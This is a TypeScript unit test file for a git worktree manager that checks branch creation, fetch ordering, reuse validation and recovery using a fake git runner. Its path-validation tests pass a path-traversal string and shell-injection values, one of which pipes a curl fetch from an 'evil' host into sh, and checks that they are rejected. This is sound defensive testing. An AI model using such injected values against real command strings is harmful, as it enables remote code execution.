import { test, expect, describe, beforeEach } from "bun:test";
import { resolve } from "path";
import {
  ensureWorktree,
  removeWorktree,
  recreateWorktreeForExistingBranch,
  resolveWorktreePath,
  WORKTREE_SUBDIR,
  DEFAULT_REMOTE,
  type GitGhRunner,
  type WorktreeStatus,
} from "../../src/session/worktree";

/**
 * Unit tests for the per-branch worktree logic (Issue #154). A fake
 * {@link GitGhRunner} stands in for git/gh so these tests exercise the Q1/Q2/Q4
 * branching without touching a real repo. The journey AC (issue body) maps to:
 *   - AC-1 (unknown branch → worktree from default): "creates a new branch ..."
 *   - AC-3 (existing worktree → reuse):              "reuses ..."
 *   - AC-4 (empty branch → error):                   "rejects ..."
 */

// Issue #227 (PR-4): GitGhRunner's git/gh methods are async now (the production
// runner uses the async `execFile`). The fake mirrors that — the in-memory
// bookkeeping stays synchronous, the `async` keyword just wraps the result so
// `await ensureWorktree(...)` matches production. `pathExists` stays sync.
class FakeRunner implements GitGhRunner {
  existing = new Set<string>(); // worktree paths that already exist (Q4)
  branches = new Set<string>(); // refs that resolve (Q1)
  // Q4 validation (#158): path → registered-worktree status. Defaults to
  // "not a registered worktree" (residue) when a path exists on disk but was
  // not created by the fake's add* methods.
  statuses = new Map<string, WorktreeStatus>();
  defaultBranchName = "main";
  calls: string[] = [];

  // Issue #277: model a stale local default branch vs. a fresh remote tip so a
  // test can assert the new worktree's HEAD equals origin/<default> (behind=0).
  // `git fetch` advances the remote-tracking ref to `remoteHead`; a base of
  // `origin/<default>` resolves to `remoteHead`, a base of the bare local
  // `<default>` resolves to the stale `localHead`.
  localHead = "STALE_LOCAL_SHA";
  remoteHead = "FRESH_ORIGIN_SHA";
  fetchShouldFail = false;
  // worktree path → the commit SHA its HEAD points at (set by add* methods).
  heads = new Map<string, string>();

  async branchExists(_dir: string, branch: string): Promise<boolean> {
    this.calls.push(`branchExists:${branch}`);
    return this.branches.has(branch);
  }
  async defaultBranch(_dir: string): Promise<string> {
    this.calls.push(`defaultBranch`);
    return this.defaultBranchName;
  }
  async fetchRemoteBranch(_dir: string, remote: string, branch: string): Promise<void> {
    this.calls.push(`fetch:${remote}:${branch}`);
    if (this.fetchShouldFail) {
      throw new Error(`fatal: unable to access '${remote}': network down`);
    }
    // A successful fetch means `origin/<branch>` now resolves to the fresh tip.
  }
  async addWorktreeFromBranch(_dir: string, path: string, branch: string): Promise<void> {
    this.calls.push(`addFromBranch:${branch}`);
    this.existing.add(path);
    // Creating a worktree registers it on `branch` (models real git).
    this.statuses.set(path, { registered: true, branch });
  }
  async addWorktreeNewBranch(
    _dir: string,
    path: string,
    branch: string,
    base: string,
  ): Promise<void> {
    this.calls.push(`addNewBranch:${branch}:${base}`);
    this.existing.add(path);
    this.statuses.set(path, { registered: true, branch });
    // Resolve the base ref to the SHA the new HEAD would point at: a remote
    // `origin/<x>` base lands on the fetched tip; a bare local base is stale.
    this.heads.set(path, base.startsWith(`${DEFAULT_REMOTE}/`) ? this.remoteHead : this.localHead);
  }
  async removeWorktree(_dir: string, path: string): Promise<void> {
    this.calls.push(`remove:${path}`);
    this.existing.delete(path);
    this.statuses.delete(path);
  }
  pathExists(path: string): boolean {
    return this.existing.has(path);
  }
  async worktreeStatus(_dir: string, path: string): Promise<WorktreeStatus> {
    this.calls.push(`worktreeStatus:${path}`);
    return this.statuses.get(path) ?? { registered: false };
  }
}

const REPO = "/Users/x/agent-base";

describe("resolveWorktreePath", () => {
  test("maps a simple branch to <repo>/.claude/worktrees/<branch>", () => {
    expect(resolveWorktreePath(REPO, "feature-foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feature-foo"),
    );
  });

  test("allows slash branch names as nested dirs", () => {
    expect(resolveWorktreePath(REPO, "feat/foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feat/foo"),
    );
  });

  test("rejects path traversal that escapes the worktrees root", () => {
    expect(() => resolveWorktreePath(REPO, "../../../tmp/evil")).toThrow(
      /path traversal/,
    );
  });

  test("rejects empty / dot branch that resolves to the root itself", () => {
    expect(() => resolveWorktreePath(REPO, ".")).toThrow(/不正/);
  });

  test("rejects shell-injection chars that would break out of cd \"<path>\"", () => {
    // Each of these is dangerous inside the downstream `cd "<path>"` string.
    for (const bad of [
      'foo"; curl evil | sh; echo "',
      "foo`id`",
      "foo$HOME",
      "foo\\bar",
      "foo\nbar",
    ]) {
      expect(() => resolveWorktreePath(REPO, bad)).toThrow(/使用できない文字/);
    }
  });

  test("allows ordinary ref punctuation (dash, dot, slash, underscore)", () => {
    expect(() => resolveWorktreePath(REPO, "feat/foo-bar.v2_x")).not.toThrow();
  });
});

describe("ensureWorktree", () => {
  let runner: FakeRunner;
  beforeEach(() => {
    runner = new FakeRunner();
  });

  test("AC-1: unknown branch → creates worktree from origin/<default> (Issue #277)", async () => {
    runner.defaultBranchName = "main";
    const result = await ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(false);
    // Base is the freshly-fetched REMOTE tip, not the bare local default.
    expect(result.baseBranch).toBe("origin/main");
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
    expect(runner.calls).toContain("addNewBranch:feature-foo:origin/main");
  });

  test("#277 AC-1: new-branch worktree HEAD equals origin/main (behind=0), fetched BEFORE add", async () => {
    // Simulate a stale local main that lags origin/main (the #258 scenario).
    runner.defaultBranchName = "main";
    runner.localHead = "STALE_LOCAL_SHA";
    runner.remoteHead = "FRESH_ORIGIN_SHA";

    const result = await ensureWorktree(REPO, "corp-dispatch-277", runner);

    // The worktree HEAD must land on the fresh origin tip → behind origin/main = 0.
    expect(runner.heads.get(result.path)).toBe(runner.remoteHead);
    expect(runner.heads.get(result.path)).not.toBe(runner.localHead);
    // A fetch of origin/main must have happened, and BEFORE the worktree add
    // (otherwise the base ref would still be stale).
    const fetchIdx = runner.calls.indexOf(`fetch:${DEFAULT_REMOTE}:main`);
    const addIdx = runner.calls.findIndex((c) => c.startsWith("addNewBranch"));
    expect(fetchIdx).toBeGreaterThanOrEqual(0);
    expect(addIdx).toBeGreaterThanOrEqual(0);
    expect(fetchIdx).toBeLessThan(addIdx);
  });

  test("#277 AC-2: git fetch failure warns LOUDLY and does not silently continue", async () => {
    runner.defaultBranchName = "main";
    runner.fetchShouldFail = true;

    const warnings: string[] = [];
    const origWarn = console.warn;
    console.warn = (...args: unknown[]) => {
      warnings.push(args.map((a) => String(a)).join(" "));
    };
    let result;
    try {
      result = await ensureWorktree(REPO, "corp-dispatch-277", runner);
    } finally {
      console.warn = origWarn;
    }

    // Loud: a warning mentioning the failed fetch + stale-base risk is emitted.
    expect(warnings.some((w) => /fetch/i.test(w) && /stale/i.test(w))).toBe(true);
    // Not a hard block: it still creates the worktree on the best-available base.
    expect(runner.calls).toContain("addNewBranch:corp-dispatch-277:origin/main");
    expect(result?.baseBranch).toBe("origin/main");
  });

  test("Q1: existing branch → checkout into worktree (no new branch)", async () => {
    runner.branches.add("existing-branch");
    const result = await ensureWorktree(REPO, "existing-branch", runner);

    expect(result.reused).toBe(false);
    expect(result.baseBranch).toBeUndefined();
    expect(runner.calls).toContain("addFromBranch:existing-branch");
    expect(runner.calls.some((c) => c.startsWith("addNewBranch"))).toBe(false);
  });

  test("AC-3 / Q4: existing valid worktree on the expected branch → reuse, no git add", async () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "feature-foo" });

    const result = await ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(true);
    expect(result.path).toBe(path);
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
    // Reuse is validated, not assumed (#158).
    expect(runner.calls).toContain(`worktreeStatus:${path}`);
  });

  // --- #158: reuse must be validated, never silently assumed -------------

  test("#158 AC-1: path exists but is NOT a registered worktree (residue) → explicit error, no silent reuse", async () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path); // dir present on disk...
    // ...but no status entry → worktreeStatus reports {registered:false}.

    await expect(ensureWorktree(REPO, "feature-foo", runner)).rejects.toThrow(
      /git worktree ではありません|残骸/,
    );
    // Must not fall through to creating/reusing.
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158 AC-1: path is a worktree but checked out on a DIFFERENT branch → explicit error", async () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "some-other-branch" });

    await expect(ensureWorktree(REPO, "feature-foo", runner)).rejects.toThrow(
      /branch.*一致|期待 branch/,
    );
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158: a detached-HEAD worktree (no branch) → explicit error, not silent reuse", async () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: null });

    await expect(ensureWorktree(REPO, "feature-foo", runner)).rejects.toThrow();
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158 AC-2: valid worktree on the expected branch → reuse succeeds (no regression)", async () => {
    const path = resolveWorktreePath(REPO, "feat/foo-bar");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "feat/foo-bar" });

    const result = await ensureWorktree(REPO, "feat/foo-bar", runner);
    expect(result.reused).toBe(true);
    expect(result.path).toBe(path);
  });

  test("is idempotent: second ensure of the same branch reuses", async () => {
    await ensureWorktree(REPO, "feature-foo", runner); // creates
    const second = await ensureWorktree(REPO, "feature-foo", runner);
    expect(second.reused).toBe(true);
  });

  test("uses dynamic default branch (Q2: master/develop mixed repos)", async () => {
    runner.defaultBranchName = "develop";
    const result = await ensureWorktree(REPO, "new-feat", runner);
    // Base tracks the remote tip of the dynamic default branch (Issue #277).
    expect(result.baseBranch).toBe("origin/develop");
    expect(runner.calls).toContain("fetch:origin:develop");
    expect(runner.calls).toContain("addNewBranch:new-feat:origin/develop");
  });

  test("AC-4: empty / whitespace branch throws", async () => {
    // ensureWorktree is async now → a thrown error becomes a rejected Promise.
    await expect(ensureWorktree(REPO, "", runner)).rejects.toThrow(/必須/);
    await expect(ensureWorktree(REPO, "   ", runner)).rejects.toThrow(/必須/);
  });

  test("trims surrounding whitespace from branch name", async () => {
    const result = await ensureWorktree(REPO, "  feature-foo  ", runner);
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
  });
});

describe("removeWorktree", () => {
  test("delegates to the runner (Q3)", async () => {
    const runner = new FakeRunner();
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);

    await removeWorktree(REPO, path, runner);

    expect(runner.calls).toContain(`remove:${path}`);
    expect(runner.pathExists(path)).toBe(false);
  });
});

/**
 * Resume-recovery path (Issue #217). A stopped branch session's worktree is
 * removed on /session stop, but the branch + cwd-keyed transcript survive, so
 * resume re-creates the worktree at the SAME path. Unlike ensureWorktree, an
 * unknown branch must NOT be created from default (no Q2) — recovery returns
 * false so the caller surfaces a clear error.
 */
describe("recreateWorktreeForExistingBranch (#217)", () => {
  let runner: FakeRunner;
  beforeEach(() => {
    runner = new FakeRunner();
  });

  test("Q4: worktree path already present → true, no git add", async () => {
    const path = resolveWorktreePath(REPO, "feat-217");
    runner.existing.add(path);
    expect(await recreateWorktreeForExistingBranch(REPO, "feat-217", runner)).toBe(
      true,
    );
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("Q1: existing branch, missing worktree → checks out from branch, true", async () => {
    runner.branches.add("feat-217");
    expect(await recreateWorktreeForExistingBranch(REPO, "feat-217", runner)).toBe(
      true,
    );
    expect(runner.calls).toContain("addFromBranch:feat-217");
    // No Q2 new-branch creation on the recovery path.
    expect(runner.calls.some((c) => c.startsWith("addNewBranch"))).toBe(false);
  });

  test("branch gone → false WITHOUT creating a new branch (no Q2)", async () => {
    expect(await recreateWorktreeForExistingBranch(REPO, "deleted", runner)).toBe(
      false,
    );
    expect(runner.calls).toContain("branchExists:deleted");
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("empty / whitespace branch → false, no git calls", async () => {
    expect(await recreateWorktreeForExistingBranch(REPO, "   ", runner)).toBe(false);
    expect(runner.calls.length).toBe(0);
  });
});
